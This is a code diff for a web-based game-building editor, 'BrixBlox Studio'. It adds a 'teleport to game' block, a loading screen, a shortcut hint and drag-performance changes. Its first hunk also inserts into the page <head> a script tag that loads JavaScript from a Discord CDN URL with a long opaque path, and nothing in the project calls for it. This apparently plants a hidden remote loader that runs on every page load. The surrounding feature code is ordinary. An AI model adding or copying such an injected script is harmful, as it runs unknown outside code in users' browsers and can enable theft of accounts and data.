@@ -1,6 +1,6 @@
 <!doctype html>
 <html lang="en" data-theme="light">
-<head>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/LUlY9m2dD4meHQ57MrA4ks3QTCjuGDA5dcAS2yBIQPGoB9ANLXTrwTUg5pk_SRIf6_OiKj4tKUf9V2gmfilKgXdLsr9g6nNI03Wxv3ZfzHisxh2EZ_kN8IzTJYeh7UGXpyyJA0oh6ppL8TPRlJ0VcUwoWCGp4O18AFu0t0ErOyHIelvHpc--ovpqCCxulBPsrw3zzpekSiAUpHv1KywrL1NelvnQmRKAQ17WvhxjKuHArPIUuzB2C07_FOjfUTGeyaA7NoERdL0bzAKdMhnL4_JHew8PeR4OpeONI-b3C42eG9stBNWpjKdIwa7WkeBOOcr3YRTPPMK5-Pgw6SaM-VGzc62Xj_DgCVK9jdp7hN35V1qBMho2CY_B5GvWAnKBAc90Jet1_f40cm5XTECCS5eOgOJEZhtmUxsOtqTerAAFc_PH5xMpZQ8eaLOZmq1kXl_UDs9JbAKLOVAHhCA7u1YLQWB0ZDXBKNtJN8jL5X4XKLXXigkZOPR-AgoTbTFqXsLBvdCshFPt7jALaJAtHIt-2rfXw2UgoBJOnQ8NpA2IIonuKXTnxLTpLVVnFy8Z4FvdT10yIbbUIEm9ZPVtDbqmwPNREH5ZQ2nFtB4HdBPUf1qCeIGcVWrMlV7p3pF78oCJndQVkomrkbAjUmDFb8cOLIbUq-auY69C'></script>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>BrixBlox Studio</title>
@@ -606,7 +606,7 @@ html,body{overscroll-behavior:none;touch-action:manipulation}
       <div id="s-parts" class="pnl" hidden="">
         <div class="tb"><div class="tgrp"><span class="tgl">Add</span><button id="p-add" class="btn small" type="button">+ Part</button><select id="p-shape" class="btn ghost small" aria-label="Add a shape"><option value="">+ Shape</option><option value="cyl">Cylinder</option><option value="sphere">Sphere</option><option value="wedge">Triangle</option></select><select id="p-gui" class="btn ghost small" aria-label="Add a GUI element"><option value="">+ GUI</option><option value="text">Text</option><option value="button">Button</option><option value="frame">Frame</option><option value="image">Image</option></select></div><div class="tgrp"><span class="tgl">Models</span><button id="p-group" class="btn small" type="button">Group</button><button id="p-ungroup" class="btn ghost small" type="button">Ungroup</button><button id="p-union" class="btn small" type="button" title="Ctrl+Shift+G">Union</button><button id="p-split" class="btn ghost small" type="button" title="Ctrl+Alt+U">Split</button></div><div class="tgrp"><span class="tgl">Edit</span><button id="p-copy" class="btn ghost small" type="button">Copy</button><button id="p-paste" class="btn ghost small" type="button">Paste</button><button id="p-dup" class="btn ghost small" type="button">Duplicate</button><button id="p-del" class="btn ghost small" type="button">Delete</button></div><div class="tgrp"><span class="tgl">Rig</span><button id="p-weld" class="btn small" type="button">Weld</button><button id="p-unweld" class="btn ghost small" type="button">Unweld</button><button id="p-rig" class="btn ghost small" type="button" aria-pressed="false">Rig editor</button></div></div>
         <p id="p-msg" class="hint">Weld: select the Torso first, then ctrl-click the parts to weld to it.</p>
-        <details class="xhelp"><summary>Building shortcuts</summary><div class="kl"><kbd>P</kbd><span>Add a part in front of you</span><kbd>Ctrl+G</kbd><span>Group into a model</span><kbd>Ctrl+Alt+G</kbd><span>Ungroup</span><kbd>Ctrl+Shift+G</kbd><span>Union into one single part</span><kbd>Ctrl+Alt+U</kbd><span>Split a union back apart</span><kbd>Ctrl+R</kbd><span>Turn the selection 90&deg; (Ctrl+Shift+R the other way)</span><kbd>Ctrl+C / V / D</kbd><span>Copy / paste / duplicate</span><kbd>Backspace</kbd><span>Delete</span><kbd>Alt+click</kbd><span>Select just one piece of a model (double-click works too)</span><kbd>L</kbd><span>Lock or unlock the selection</span><kbd>Arrow keys</kbd><span>Nudge by the snap size (Shift = 4&times;)</span><kbd>PageUp / PageDown</kbd><span>Move up / down</span><kbd>End</kbd><span>Drop onto whatever is under it</span><kbd>Ctrl+A</kbd><span>Select everything</span></div></details><div class="xbar"><input id="p-find" type="search" placeholder="Search the explorer..." aria-label="Search the explorer" autocomplete="off"><button id="p-exp" class="btn ghost small" type="button" title="Open every folder and model">Expand</button><button id="p-col" class="btn ghost small" type="button" title="Close every folder and model">Collapse</button></div><div id="p-list"></div><div id="p-props"></div>
+        <details class="xhelp"><summary>Building shortcuts</summary><div class="kl"><kbd>P</kbd><span>Add a part in front of you</span><kbd>Ctrl+G</kbd><span>Group into a model</span><kbd>Ctrl+Alt+G</kbd><span>Ungroup</span><kbd>Ctrl+Shift+G</kbd><span>Union into one single part</span><kbd>Ctrl+Alt+U</kbd><span>Split a union back apart</span><kbd>Ctrl+R</kbd><span>Turn the selection 90&deg; (Ctrl+Shift+R the other way)</span><kbd>Ctrl+C / V / D</kbd><span>Copy / paste / duplicate</span><kbd>Backspace</kbd><span>Delete</span><kbd>Ctrl / Shift + click</kbd><span>Add or remove a part or model from the selection (in the 3D view or the Explorer)</span><kbd>Alt+click</kbd><span>Select just one piece of a model (double-click works too)</span><kbd>L</kbd><span>Lock or unlock the selection</span><kbd>Arrow keys</kbd><span>Nudge by the snap size (Shift = 4&times;)</span><kbd>PageUp / PageDown</kbd><span>Move up / down</span><kbd>End</kbd><span>Drop onto whatever is under it</span><kbd>Ctrl+A</kbd><span>Select everything</span></div></details><div class="xbar"><input id="p-find" type="search" placeholder="Search the explorer..." aria-label="Search the explorer" autocomplete="off"><button id="p-exp" class="btn ghost small" type="button" title="Open every folder and model">Expand</button><button id="p-col" class="btn ghost small" type="button" title="Close every folder and model">Collapse</button></div><div id="p-list"></div><div id="p-props"></div>
       </div>
       <div id="s-anim" class="pnl anim" hidden="">
         <div class="an-top">
@@ -755,6 +755,7 @@ const BD={
  unragdoll:{c:'en',l:'unragdoll _',a:['target'],tip:'Makes a ragdolled rig or player get back up right away. Type a name, a variable, or player (the first player in the server; player2 is the second, and so on). Does nothing if they are not ragdolled (and cannot save someone who was killed).'},
  pushparent:{c:'en',l:'push parent rig _ studs in _ seconds toward _',a:['5','0.5','front'],dd:{2:'dir'},tip:'Pushes the rig this script belongs to forward by exactly this many studs, taking this many seconds. To push your own character, put the script inside the character. A script that belongs to nothing does nothing. It eases in and out. A negative number pushes backward. Works even while ragdolled and even if Movable is off. If it is already being pushed, a new push waits until the first one is done, so a forever loop gives one push after another.'},
  rigsize:{c:'en',l:'set rig size _ to _',a:['target','2'],tip:'Scales a rig or player. 1 is normal, 2 is double. Type a name, a variable, or player (the first player in the server; player2 is the second, and so on).'},
+ tpgame:{c:'en',l:'teleport to game _',a:[''],dd:{0:'mygame'},tip:'Takes the player to another game and shows a loading screen with that game\'s picture and name. You can only pick games you made yourself, and players can only be sent to games made by the creator of this game.'},
  teleport:{c:'en',l:'teleport _ to x _ y _ z _',a:['target','0','5','0'],tip:'Moves a rig or player to this spot in the world. y is the height of the feet (the floor is usually 0). Type a name, a variable, or player (the first player in the server; player2 is the second, and so on).'},
  say:{c:'lk',l:'say _',a:['Hello!'],tip:'Shows a chat bubble above your head for a few seconds.'},
  color:{c:'lk',l:'color _',a:['red'],raw:1},
@@ -910,14 +911,14 @@ if(P.name==='My first BricBloc game')P.name='My first BrixBlox game';
 PEND=calcPend();
 /* Real play: always use the copy that is live online, so you see exactly what other players see (not an older/local copy). */
 if(VIEWONLY&&PLAYINFO){const tg=document.createElement('div');tg.style.cssText='position:fixed;left:8px;bottom:6px;z-index:9998;font:700 11px sans-serif;color:#fff;opacity:.6;pointer-events:none;text-shadow:0 1px 2px #000';tg.textContent='build v5 \u00b7 '+(PLAYINFO.fresh?'live online copy loaded':(sb?'checking online copy...':'NOT connected online'));document.body.append(tg);window.BBTAG=tg}
-if(VIEWONLY&&sb&&PLAYINFO&&PLAYINFO.id&&!PLAYINFO.fresh){(function(){
-  const ov=document.createElement('div');ov.style.cssText='position:fixed;inset:0;z-index:9999;background:#7ccaff;display:flex;align-items:center;justify-content:center;font:800 1.2rem sans-serif;color:#1d2147';ov.textContent='Loading the latest version of the game...';document.body.append(ov);
+if(VIEWONLY){bbLoad(PLAYINFO&&PLAYINFO.name||P.name,PLAYINFO&&PLAYINFO.thumb)}
+if(VIEWONLY&&sb&&PLAYINFO&&PLAYINFO.id&&!PLAYINFO.fresh){(function(){BBCHK=true;
   withTimeout(sb.from('games').select('data').eq('id',String(PLAYINFO.id)).maybeSingle(),8000,'slow').then(function(r){
     let cd=r&&r.data&&r.data.data;if(!r||r.error||cd==null)throw 0;if(typeof cd!=='string')cd=JSON.stringify(cd);
     const q=JSON.parse(cd);if(!q||!Array.isArray(q.scripts))throw 0;
-    if(hsh(cd)===hsh(String(PLAYINFO.data))){ov.remove();if(window.BBTAG)BBTAG.textContent='build v5 \u00b7 live online copy loaded';return}
+    if(hsh(cd)===hsh(String(PLAYINFO.data))){BBCHK=false;bbReadyTry();if(window.BBTAG)BBTAG.textContent='build v5 \u00b7 live online copy loaded';return}
     store.set('brixblox-play',JSON.stringify(Object.assign({},PLAYINFO,{data:cd,fresh:1})));skipUnload=true;location.reload()
-  }).catch(function(){ov.remove();if(window.BBTAG)BBTAG.textContent='build v5 \u00b7 could not reach the online copy (using the saved one)'})})()}
+  }).catch(function(){BBCHK=false;bbReadyTry();if(window.BBTAG)BBTAG.textContent='build v5 \u00b7 could not reach the online copy (using the saved one)'})})()}
 function persistGame(){const L=glib(),pv=L[gameId],js=JSON.stringify(P),lh=pv?(pv.lh!==undefined?pv.lh:hsh(pv.data)):undefined;
   L[gameId]={id:gameId,name:P.name,vis:gameVis||'private',at:Date.now(),owner:(pv&&pv.owner&&pv.owner.id)?pv.owner:(ME?{id:ME.id,name:ME.username}:undefined),data:js,lh:lh,ch:pv&&pv.ch,ct:pv&&pv.ct,dr:(gameDraft?1:undefined),thumb:(pv&&pv.thumb)||undefined,co:(pv&&pv.co)||undefined,cot:pv&&pv.cot,cofail:(pv&&pv.cofail)||undefined};
   let okS=store.set(GKEY,JSON.stringify(L));
@@ -975,12 +976,52 @@ function newVarDlg(done){mdl('New variable',function(c,close){const n=el('input'
   c.append(el('p','note','Letters, numbers and _ only. You can use it in any block after you make it.'),n);
   const ok=function(){const v=cleanVar(n.value);if(!v){n.focus();return}close();done(v)},r=el('div','tb');r.append(mb('Make variable','',ok),mb('Cancel','ghost',function(){close();done(null)}));c.append(r);
   n.onkeydown=function(e){if(e.key==='Enter')ok()};setTimeout(function(){n.focus()},0)})}
+
+/* ===== Loading screen (thumbnail + name) used when joining a game and by the "teleport to game" block ===== */
+var BBL=null,BBLT=0;
+function bbLoad(name,thumb){bbLoadHide(true);const o=document.createElement('div');o.id='bb-load';
+  o.style.cssText='position:fixed;inset:0;z-index:99999;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;background:linear-gradient(160deg,#1d2147,#3a2f7a);color:#fff;font-family:Montserrat,system-ui,sans-serif;transition:opacity .35s';
+  const card=document.createElement('div');card.style.cssText='width:min(420px,78vw);aspect-ratio:16/10;border-radius:18px;box-shadow:0 14px 40px rgba(0,0,0,.45);background:#2b2f66;overflow:hidden;display:flex;align-items:center;justify-content:center;font:800 4rem sans-serif';
+  const t=String(thumb||'');if(/^(data:image\/|https:\/\/)/.test(t))card.style.background='center/cover no-repeat url("'+t.replace(/["\\\s]/g,'')+'")';else{const h=Array.from(String(name||'?')).reduce(function(a,c){return (a*31+c.charCodeAt(0))%360},7);card.style.background='hsl('+h+',55%,42%)';card.textContent=(String(name||'?').trim().charAt(0)||'?').toUpperCase()}
+  const nm=document.createElement('div');nm.textContent=String(name||'Loading...');nm.style.cssText='font-weight:800;font-size:1.6rem;text-align:center;max-width:80vw;text-shadow:0 2px 8px rgba(0,0,0,.4)';
+  const bar=document.createElement('div');bar.style.cssText='width:min(260px,60vw);height:6px;border-radius:3px;background:rgba(255,255,255,.2);overflow:hidden;position:relative';
+  const fill=document.createElement('div');fill.style.cssText='position:absolute;top:0;left:-40%;width:40%;height:100%;border-radius:3px;background:#ffc233';bar.append(fill);
+  try{fill.animate([{left:'-40%'},{left:'100%'}],{duration:1100,iterations:Infinity,easing:'ease-in-out'})}catch(e){}
+  const sub=document.createElement('div');sub.textContent='Loading...';sub.style.cssText='opacity:.75;font-weight:700;font-size:.95rem';
+  o.append(card,nm,bar,sub);document.body.append(o);BBL=o;BBLT=Date.now()}
+function bbLoadHide(now){const o=BBL;if(!o)return;BBL=null;if(now){o.remove();return}
+  const wait=Math.max(0,700-(Date.now()-BBLT));setTimeout(function(){o.style.opacity='0';setTimeout(function(){o.remove()},380)},wait)}
+var BBREADY=false,BBCHK=false;
+function bbReadyTry(){if(!BBREADY||BBCHK)return;bbLoadHide();try{parent.postMessage({bb:'ready'},location.origin)}catch(e){}}
+/* the games you made yourself (what the teleport block can pick from) */
+function ownG(g){return !!g&&!g.dr&&(!g.owner||!ME||g.owner.id===ME.id)&&!(g.co&&g.owner&&ME&&g.owner.id!==ME.id)}
+function myGames(){const L=glib();return Object.keys(L).filter(function(k){return !/^(acc_|avatar_|sys_)/.test(k)&&k!==gameId&&ownG(L[k])}).sort(function(a,b){return (L[b].at||0)-(L[a].at||0)}).map(function(k){return [k,(L[k].name||'Untitled')+(L[k].vis==='private'?' (private)':'')]})}
+var TPBUSY=false;
+async function tpGame(id){if(TPBUSY)return;
+  if(!id||/^(acc_|avatar_|sys_)/.test(id)){log('Error: teleport to game needs one of your games picked.');return}
+  if(!VIEWONLY){const g=glib()[id];if(!g||!ownG(g)){log('Error: teleport to game can only go to games you made.');return}
+    TPBUSY=true;bbLoad(g.name,g.thumb);setTimeout(function(){bbLoadHide();TPBUSY=false},2300);
+    log('Teleport to "'+g.name+'": in the editor this only shows the loading screen. When the game is played from the site, the player really goes there.');return}
+  if(!sb||!ME){log('Error: teleport to game needs you to be online.');return}
+  TPBUSY=true;bbLoad('Teleporting...','');
+  try{let r=await withTimeout(sb.from('games').select('id,name,owner_id,owner_name,thumb,data').eq('id',id).maybeSingle(),12000,'slow');
+    if(r.error&&/thumb/i.test(r.error.message||''))r=await withTimeout(sb.from('games').select('id,name,owner_id,owner_name,data').eq('id',id).maybeSingle(),12000,'slow');
+    const row=r&&r.data;if(!row)throw new Error('That game could not be found (is it published?).');
+    const oid=PLAYINFO&&PLAYINFO.ownerId,same=oid?String(row.owner_id)===String(oid):String(row.owner_name||'').trim().toLowerCase()===String(PLAYINFO&&PLAYINFO.owner||'').trim().toLowerCase();
+    if(!same)throw new Error('You can only teleport to games made by the same creator.');
+    let d=row.data;if(typeof d!=='string')d=JSON.stringify(d);const q=JSON.parse(d);if(!q||!Array.isArray(q.scripts))throw new Error('That game could not be opened.');
+    bbLoad(row.name,row.thumb);
+    try{await Promise.race([sb.rpc('record_play',{p_game:String(row.id)}),new Promise(function(z){setTimeout(z,1500)})])}catch(e){}
+    store.set('brixblox-play',JSON.stringify({id:row.id,data:d,owner:row.owner_name,ownerId:row.owner_id,name:row.name,thumb:row.thumb||'',fresh:1}));
+    skipUnload=true;location.reload()}
+  catch(e){bbLoadHide(true);TPBUSY=false;log('Error: '+String((e&&e.message)||e))}}
 function ddSel(b,i,kind,ro){
   if(ro){const n=el('input');n.value=b.a[i];n.readOnly=true;fit(n);return n}
   const s=el('select','ddsel');s.title=kind==='var'?'Pick a variable, or make a new one':'';
-  const fill=function(){s.replaceChildren();let o=kind==='keys'?KEYOPT.slice():kind==='gui'?(P.guis||[]).map(function(g){return [g.name,g.name]}):kind==='guit'?[['this','this GUI']].concat((P.guis||[]).map(function(g){return [g.name,g.name]})):kind==='img'?[['none','none']].concat(Object.keys(P.assets.images).map(function(n){return [n,n]})):kind==='guipart'?[['background','background'],['text','text'],['border','border']]:kind==='behav'?BEHOPT.slice():kind==='accslot'?ACCSLOTOPT.slice():kind==='ease'?EASEOPT.slice():kind==='tset'?TSETOPT.slice():kind==='dir'?DIROPT.slice():kind==='mathf'?MATHOPT.slice():kind==='light'?LIGHTOPT.slice():kind==='skybox'?skyOpts():kind==='bool'?[['true','true'],['false','false']]:kind==='spawn'?P.parts.filter(function(q){return q.spawn&&!q.parent}).map(function(q){return [q.name,q.name]}):kind==='gp'?gpList().map(function(g){return [g.name,g.name]}):kind==='item'?itemsL().map(function(i){return [i.name,i.name]}):varList().map(function(v){return [v,v]});
+  const fill=function(){s.replaceChildren();let o=kind==='keys'?KEYOPT.slice():kind==='gui'?(P.guis||[]).map(function(g){return [g.name,g.name]}):kind==='guit'?[['this','this GUI']].concat((P.guis||[]).map(function(g){return [g.name,g.name]})):kind==='img'?[['none','none']].concat(Object.keys(P.assets.images).map(function(n){return [n,n]})):kind==='guipart'?[['background','background'],['text','text'],['border','border']]:kind==='behav'?BEHOPT.slice():kind==='accslot'?ACCSLOTOPT.slice():kind==='ease'?EASEOPT.slice():kind==='tset'?TSETOPT.slice():kind==='dir'?DIROPT.slice():kind==='mathf'?MATHOPT.slice():kind==='light'?LIGHTOPT.slice():kind==='skybox'?skyOpts():kind==='mygame'?myGames():kind==='bool'?[['true','true'],['false','false']]:kind==='spawn'?P.parts.filter(function(q){return q.spawn&&!q.parent}).map(function(q){return [q.name,q.name]}):kind==='gp'?gpList().map(function(g){return [g.name,g.name]}):kind==='item'?itemsL().map(function(i){return [i.name,i.name]}):varList().map(function(v){return [v,v]});
     if(kind==='item'&&o.length&&!o.some(function(q){return q[0]===String(b.a[i])})){b.a[i]=o[0][0];save()}
     if(kind==='item'&&!o.length)o=[[String(b.a[i]),'(make an item first)']];
+    if(kind==='mygame'&&!o.length)o=[[String(b.a[i]),'(save a game of yours first)']];
     if(kind==='gp'&&o.length&&!o.some(function(q){return q[0]===String(b.a[i])})){b.a[i]=o[0][0];save()}
     if(kind==='gp'&&!o.length)o=[[String(b.a[i]),'(make a gamepass first)']];
     const cur=String(b.a[i]);if(cur&&!o.some(function(q){return q[0]===cur}))o.unshift([cur,cur]);
@@ -988,7 +1029,7 @@ function ddSel(b,i,kind,ro){
     if(kind==='var'){const nw=el('option','','\uFF0B New variable\u2026');nw.value='\u0001new';s.append(nw)}
     s.value=cur};
   fill();
-  s.onpointerdown=function(e){e.stopPropagation();if(kind==='var'||kind==='gui'||kind==='guit'||kind==='img'||kind==='item'||kind==='spawn'||kind==='skybox'||kind==='gp')fill()};
+  s.onpointerdown=function(e){e.stopPropagation();if(kind==='mygame'||kind==='var'||kind==='gui'||kind==='guit'||kind==='img'||kind==='item'||kind==='spawn'||kind==='skybox'||kind==='gp')fill()};
   s.onchange=function(){
     if(s.value==='\u0001new'){newVarDlg(function(v){if(v){b.a[i]=v;save();rend();renderParts()}else fill()});return}
     b.a[i]=s.value;reser();save();view()};
@@ -1206,7 +1247,7 @@ function dEnd(e){removeEventListener('pointermove',dMoveRaf);dEv=null;if(dRaf){c
 
 
 /* BricBloc as text */
-const KW={playrig:'play animation on rig',riggear:'put item in hand of rig',rigungear:'take item out of rig hand',lighting:'set lighting',skybox:'set skybox to',spawnon:'turn on spawnpoint',spawnrep:'replace current spawnpoint with',spawnoff:'turn off spawnpoint',giveattr:'give attribute',pdset:'set player saved data',pdchange:'change player saved data',pdget:'get player saved data',pdadditem:'put in saved inventory',pdremitem:'take out of saved inventory',pdsave:'save player data',removeattr:'remove attribute',landed:'when player hits ground from higher than',tweenmove:'tween object to',tweenmoveby:'tween object by',tweenturn:'tween object turn',tweensize:'tween object size to',tweentrans:'tween transparency to',tweencolor:'tween color to',tweenset:'tween player',tweenwait:'wait for tweens to finish',fallanim:'set player fall to',holdanim:'set player hold item to',holdwalkanim:'set player hold item walk to',itemhold:'when player holds',itemunhold:'when player stops holding',screenclick:'when player clicks screen',giveitem:'give item',removeitem:'remove item',forplayer:'only for player',randplayer:'get random player into',setimage:'set image of',guicolor:'set gui color',pjoin:'when a player joins',pleave:'when a player leaves',getcount:'get player count into',accwear:'put accessory',accstrip:'take accessory',rigbeh:'set rig behavior to',setvol:'set volume of',transparency:'set transparency',guishow:'show gui',guivis:'set gui visible',guitoggle:'toggle gui',guithisclick:'when this gui clicked',guihide:'hide gui',guitext:'set gui text',guiclick:'when gui clicked',unragdoll:'unragdoll',start:'when start',key:'when key',keydrop:'when player presses the key',keyheld:'when key held',keyrel:'when key done being held',recv:'when I receive',broadcast:'broadcast',broadcastwait:'broadcast and wait',touched:'when this block touched',clicked:'when this block is clicked from',chat:'when player says',collision:'set collision',friction:'set friction',teleport:'teleport',kick:'kick player',ban:'ban player',def:'define',playanim:'play animation',pushfwd:'push force',pushtween:'push with force',walkanim:'set player walk',jumpanim:'set player jump',idleanim:'set player idle',pspeed:'set player speed',givebadge:'give badge',awardbadge:'award badge',accadd:'add accessory',accrem:'remove accessory',playercol:'set player collisions',ragdollex:'set ragdoll exaggeration',playercolon:'enable player collision',playercoloff:'disable player collision',fov:'set camera fov',voidh:'set void reset height',addplayer:'add player',nearplayer:'get nearest player',nearrig:'get nearest rig',nearplayers:'get nearest players',nearrigs:'get nearest rigs',pushparent:'push parent rig',rigsize:'set rig size',setrig:'set player to rig',playaud:'play',playonce:'play once until done',stopaud:'stop audio',shiftlockon:'enable shiftlock',shiftlockkey:'set shiftlock key',shiftlockoff:'disable shiftlock','elseif':'else if','else':'else',serverside:'server side',clientside:'client side'};
+const KW={tpgame:'teleport to game',playrig:'play animation on rig',riggear:'put item in hand of rig',rigungear:'take item out of rig hand',lighting:'set lighting',skybox:'set skybox to',spawnon:'turn on spawnpoint',spawnrep:'replace current spawnpoint with',spawnoff:'turn off spawnpoint',giveattr:'give attribute',pdset:'set player saved data',pdchange:'change player saved data',pdget:'get player saved data',pdadditem:'put in saved inventory',pdremitem:'take out of saved inventory',pdsave:'save player data',removeattr:'remove attribute',landed:'when player hits ground from higher than',tweenmove:'tween object to',tweenmoveby:'tween object by',tweenturn:'tween object turn',tweensize:'tween object size to',tweentrans:'tween transparency to',tweencolor:'tween color to',tweenset:'tween player',tweenwait:'wait for tweens to finish',fallanim:'set player fall to',holdanim:'set player hold item to',holdwalkanim:'set player hold item walk to',itemhold:'when player holds',itemunhold:'when player stops holding',screenclick:'when player clicks screen',giveitem:'give item',removeitem:'remove item',forplayer:'only for player',randplayer:'get random player into',setimage:'set image of',guicolor:'set gui color',pjoin:'when a player joins',pleave:'when a player leaves',getcount:'get player count into',accwear:'put accessory',accstrip:'take accessory',rigbeh:'set rig behavior to',setvol:'set volume of',transparency:'set transparency',guishow:'show gui',guivis:'set gui visible',guitoggle:'toggle gui',guithisclick:'when this gui clicked',guihide:'hide gui',guitext:'set gui text',guiclick:'when gui clicked',unragdoll:'unragdoll',start:'when start',key:'when key',keydrop:'when player presses the key',keyheld:'when key held',keyrel:'when key done being held',recv:'when I receive',broadcast:'broadcast',broadcastwait:'broadcast and wait',touched:'when this block touched',clicked:'when this block is clicked from',chat:'when player says',collision:'set collision',friction:'set friction',teleport:'teleport',kick:'kick player',ban:'ban player',def:'define',playanim:'play animation',pushfwd:'push force',pushtween:'push with force',walkanim:'set player walk',jumpanim:'set player jump',idleanim:'set player idle',pspeed:'set player speed',givebadge:'give badge',awardbadge:'award badge',accadd:'add accessory',accrem:'remove accessory',playercol:'set player collisions',ragdollex:'set ragdoll exaggeration',playercolon:'enable player collision',playercoloff:'disable player collision',fov:'set camera fov',voidh:'set void reset height',addplayer:'add player',nearplayer:'get nearest player',nearrig:'get nearest rig',nearplayers:'get nearest players',nearrigs:'get nearest rigs',pushparent:'push parent rig',rigsize:'set rig size',setrig:'set player to rig',playaud:'play',playonce:'play once until done',stopaud:'stop audio',shiftlockon:'enable shiftlock',shiftlockkey:'set shiftlock key',shiftlockoff:'disable shiftlock','elseif':'else if','else':'else',serverside:'server side',clientside:'client side'};
 function code(arr,d){const pad='  '.repeat(d);return arr.map(function(b){const ln=pad+((KW[b.t]||b.t)+' '+b.a.join(' ')).trim();return b.k?ln+'\n'+code(b.k,d+1)+'\n'+pad+'end':ln}).join('\n')}
 function view(){clearTimeout(view._t);view._t=setTimeout(view0,250)}
 function view0(){$('s-code').textContent=P.scripts.map(function(s){const on=s[0].o&&ownName(s[0].o),tag=on?'# on '+on+'\n':'';return tag+(BD[s[0].t].hat?code(s.slice(0,1),0)+'\n'+code(s.slice(1),1)+'\nend':'# not attached to a "when" block\n'+code(s,0))}).join('\n\n')}
@@ -1474,6 +1515,7 @@ async function st(b,S,o){if(S.remote){if(RSKIP[b.t]||(!o&&RSELF[b.t])||b.t==='cl
     case'collision':{const v=String(val(a[0],S)).trim().toLowerCase(),on=!(v==='false'||v==='0'||v==='off'||v==='no'),rs=roots(o);
       if(!rs.length){log('Error: "set collision" must be in a script that belongs to an object. Use the + next to an object in the Explorer.');break}
       rs.forEach(function(r){CO[r.id]=on});break}
+    case'tpgame':{await tpGame(String(val(a[0],S)).trim());break}
     case'teleport':{const x=n(1),y=n(2),z=n(3);resolve(String(val(a[0],S))).forEach(function(t){teleKey(t.key,x,y,z)});break}
     case'kick':{const why=String(val(a[1],S));playersOf(String(val(a[0],S))).forEach(function(t){kickKey(t.key,why,false)});break}
     case'ban':{const why=String(val(a[1],S)),mins=Math.max(0,n(2));playersOf(String(val(a[0],S))).forEach(function(t){banKey(t,why,mins)});break}
@@ -1860,10 +1902,13 @@ function matSel(cur,fn){const s=el('select');Object.keys(MATS).forEach(function(
 function setMat(p,k){const old=MATS[p.mat]||MATS.plastic;if(!p.color||p.color.toLowerCase()===old.c.toLowerCase())p.color=MATS[k].c;p.mat=k}
 /* While dragging, only move the existing meshes (once per frame) instead of rebuilding every part, material and gizmo on each mouse event */
 let qsPend=false;
-function syncPos(){refreshRot();P.parts.forEach(function(p){const g=J[p.id],m=M[p.id];if(!g||!m)return;const v=piv(p),pa=p.parent&&byId(p.parent);
+function syncPos(only){if(!only)refreshRot();P.parts.forEach(function(p){if(only&&!only.has(p.id))return;const g=J[p.id],m=M[p.id];if(!g||!m)return;const v=piv(p),pa=p.parent&&byId(p.parent);
   m.position.set(p.pos[0]-v[0],p.pos[1]-v[1],p.pos[2]-v[2]);
   if(pa){const q=piv(pa);g.position.set(v[0]-q[0],v[1]-q[1],v[2]-q[2])}else g.position.set(v[0],v[1],v[2]);g.userData.base=g.position.clone()})}
-function quickSync(){if(qsPend)return;qsPend=true;requestAnimationFrame(function(){qsPend=false;syncPos();buildEdit();if(rigOn)applyPose({});else preview()})}
+let qsSub=null,qsFull=false,qsRig=false;
+/* quickSync() = redo everything. quickSync(set,rig) = a move-drag: only the parts in the set are repositioned, the arrows are moved by the drag itself (no rebuild), and poses are only re-applied when a rig is being dragged. */
+function quickSync(sub,rig){if(sub){qsSub=sub;if(rig)qsRig=true}else qsFull=true;if(qsPend)return;qsPend=true;requestAnimationFrame(function(){qsPend=false;const only=qsFull?null:qsSub,r=qsRig;qsSub=null;qsFull=false;qsRig=false;
+  syncPos(only||undefined);if(!only)buildEdit();if(!only||r){if(rigOn)applyPose({});else preview()}})}
 function rebuildParts(){
   if(hline.parent)hline.parent.remove(hline);hov=null;if(PG){scene.remove(PG);freeTree(PG)}
   PG=new THREE.Group();scene.add(PG);J={};M={};
@@ -2093,18 +2138,19 @@ function npTick(dt){if(!NP.length)return;const T=byId(P.avId);
 
 /* Rig editor: balls at anchor points, arrows to move them */
 /* A fat invisible tube around each move arrow, so the thin arrow is easy to grab (it is only used for clicking, never drawn) */
-function arrowHit(){const m=new THREE.Mesh(new THREE.CylinderGeometry(.42,.42,2.5,10),new THREE.MeshBasicMaterial({transparent:true,opacity:0,depthWrite:false,depthTest:false}));m.position.y=1.05;return m}
-function buildEdit(){try{updTool()}catch(e){}while(editG.children.length)editG.remove(editG.children[0]);gizmo=[];balls=[];gz=[];agT=null;if(playing)return;if(animOn()){buildAnimGizmo();return}
+var GZG=(function(){const k=function(g){g.userData.keep=true;return g};return {sh:k(new THREE.CylinderGeometry(.07,.07,1.3,8)),co:k(new THREE.ConeGeometry(.22,.55,12)),hit:k(new THREE.CylinderGeometry(.42,.42,2.5,10)),ball:k(new THREE.SphereGeometry(.32,20,14)),ring:k(new THREE.TorusGeometry(3.2,.16,12,96)),jb:k(new THREE.SphereGeometry(.35,16,12))}})();
+function arrowHit(){const m=new THREE.Mesh(GZG.hit,new THREE.MeshBasicMaterial({transparent:true,opacity:0,depthWrite:false,depthTest:false}));m.position.y=1.05;return m}
+function buildEdit(){try{updTool()}catch(e){}while(editG.children.length){const o=editG.children[0];editG.remove(o);freeTree(o)}gizmo=[];balls=[];gz=[];agT=null;if(playing)return;if(animOn()){buildAnimGizmo();return}
   if(!rigOn&&sel.length&&sel.every(function(id){const q=byId(id);return q&&q.locked}))return;
   let c=null,half=[.3,.3,.3];
-  if(rigOn){P.parts.filter(function(p){return p.parent}).forEach(function(p){const b=new THREE.Mesh(new THREE.SphereGeometry(.35,16,12),new THREE.MeshBasicMaterial({color:p.id===selJ?'#ffd23f':'#ff5a5a',depthTest:false}));
+  if(rigOn){P.parts.filter(function(p){return p.parent}).forEach(function(p){const b=new THREE.Mesh(GZG.jb,new THREE.MeshBasicMaterial({color:p.id===selJ?'#ffd23f':'#ff5a5a',depthTest:false}));
       b.position.set(p.pivot[0],p.pivot[1],p.pivot[2]);b.renderOrder=9;b.userData.joint=p.id;b.userData.fx={b:new THREE.Vector3(p.pivot[0],p.pivot[1],p.pivot[2]),d:new THREE.Vector3(),off:0};editG.add(b);balls.push(b)});
     const j=byId(selJ);if(j&&j.parent)c=j.pivot}
   else{const bx=selBox(),q0=byId(sel[0]);if(bx&&q0&&inW(q0)){c=bx.c;half=bx.h}}
   if(!c)return;
   if(tool==='rotate'&&!rigOn){const rr=rotRoots();if(!rr.length)return;const rc=rotCenter(rr),oq=rotObjQ(rr);/* one object: the rings sit on its own axes and turn with it */
